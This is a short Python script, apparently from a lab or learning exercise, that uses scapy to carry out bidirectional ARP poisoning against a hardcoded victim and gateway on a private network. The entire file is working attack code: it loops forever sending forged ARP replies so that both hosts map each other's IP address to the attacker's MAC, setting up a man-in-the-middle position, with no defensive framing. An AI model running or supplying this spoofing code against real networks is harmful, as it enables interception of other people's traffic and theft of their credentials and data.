import socket

from whois import whois

from scapy.all import *
from random import randint
import time


# ARP双向毒化
def main():
    gatewayIP="192.168.153.2"
    victimIP = "192.168.153.136"

    hackMAC = "00:50:56:29:3b:23"
    victimMAC="00:0c:29:4c:9f:51"
    gatewayMAC = "00:50:56:e7:74:7d"

    # print(getmacbyip("192.168.153.2"))
    # 二层没有IP， op=2会形成 "is-at"
    packet1 = Ether(src=hackMAC, dst=victimMAC)/ARP(hwsrc=hackMAC, hwdst=victimMAC, psrc=gatewayIP, pdst=victimIP, op=2)
    packet2 = Ether(src=hackMAC, dst=gatewayMAC)/ARP(hwsrc=hackMAC, hwdst=gatewayMAC, psrc=victimIP, pdst=gatewayIP, op=2)
    while True:
        sendp(packet1, iface="eth0", verbose=False)
        sendp(packet2, iface="eth0", verbose=False)
        time.sleep(1)
        print(packet1.show())
        print(packet2.show())


if __name__ == '__main__':
    main()
